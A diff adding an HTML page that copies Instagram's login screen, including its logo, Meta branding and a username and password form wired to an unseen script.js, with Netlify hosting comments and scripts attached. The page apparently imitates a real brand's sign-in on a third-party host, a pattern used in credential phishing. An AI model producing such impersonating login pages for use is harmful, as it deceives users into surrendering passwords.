@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+<!-- This site is hosted on Netlify. Anyone can build and deploy a site
+     like this one for free: https://netlify.new/?utm_campaign=ai-legible&utm_source=comment&utm_medium=referral&utm_id=105db086-93da-4005-9431-f3f72be2ef48
+     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
+<meta name="hosting-provider" content="Netlify">
+<meta name="netlify-deploy" content="https://netlify.new/?utm_campaign=ai-legible&amp;utm_source=meta&amp;utm_medium=referral&amp;utm_id=105db086-93da-4005-9431-f3f72be2ef48">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram</title>
+  <link rel="stylesheet" href="styles.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet"/>
+</head>
+<body>
+
+  <div class="page">
+
+    <!-- Language -->
+    <div class="lang">English (US)</div>
+
+    <!-- Logo Icon -->
+    <div class="logo-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="90" height="90">
+        <defs>
+          <radialGradient id="bg" cx="30%" cy="107%" r="130%" gradientUnits="objectBoundingBox">
+            <stop offset="0%"   stop-color="#feda77"/>
+            <stop offset="10%"  stop-color="#f8b43a"/>
+            <stop offset="30%"  stop-color="#f2683c"/>
+            <stop offset="50%"  stop-color="#e1306c"/>
+            <stop offset="70%"  stop-color="#c13584"/>
+            <stop offset="85%"  stop-color="#833ab4"/>
+            <stop offset="100%" stop-color="#405de6"/>
+          </radialGradient>
+        </defs>
+        <rect width="100" height="100" rx="26" ry="26" fill="url(#bg)"/>
+        <rect x="18" y="18" width="64" height="64" rx="18" ry="18"
+              fill="none" stroke="white" stroke-width="5.5"/>
+        <circle cx="50" cy="50" r="17"
+                fill="none" stroke="white" stroke-width="5.5"/>
+        <circle cx="50" cy="50" r="6" fill="white"/>
+        <circle cx="73" cy="27" r="4.5" fill="white"/>
+      </svg>
+    </div>
+
+    <!-- Form -->
+    <form id="loginForm">
+
+      <!-- Input 1: username or email -->
+      <div class="input-wrap" style="position:relative;">
+        <input
+          type="text"
+          id="username"
+          placeholder="Username, email or mobile number"
+          autocomplete="off"
+        />
+        <!-- Suggestions dropdown -->
+        <div class="suggestions-box" id="suggestionsList"></div>
+      </div>
+
+      <!-- Input 2: password -->
+      <div class="input-wrap">
+        <input
+          type="password"
+          id="password"
+          placeholder="Password"
+          autocomplete="current-password"
+        />
+        <button type="button" class="show-hide" id="togglePassword">Show</button>
+      </div>
+
+      <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+    </form>
+
+    <a href="#" class="forgot">Forgot password?</a>
+
+    <div class="spacer"></div>
+
+    <!-- Create account -->
+    <a href="#" class="create-btn">Create new account</a>
+
+    <!-- Meta logo -->
+    <div class="meta-logo">
+      <svg viewBox="0 0 60 17" fill="none" xmlns="http://www.w3.org/2000/svg" width="54" height="15">
+        <path d="M0 16.5V.5h3.6l5.4 9L14.4.5H18v16H14.6V7.1l-5.6 9.4-5.6-9.4V16.5H0zM22 16.5V.5h12v3H25.5v3.7h7.7v3H25.5v3.3H34v3H22zM38.5 16.5V3.5H33V.5h12v3H39.5v13h-1zM47.5 16.5l6-16h3.5l6 16H59l-1.4-4H51l-1.4 4h-2.1zm4.3-7h5l-2.5-7-2.5 7z" fill="white" fill-opacity="0.6"/>
+      </svg>
+    </div>
+
+  </div>
+
+  <script type="module" src="script.js"></script>
+</body>
+</html><script async src="/.netlify/scripts/hud?variant=public" data-nf-variant="public" data-netlify-site-id="105db086-93da-4005-9431-f3f72be2ef48" data-app-host="app.netlify.com"></script>
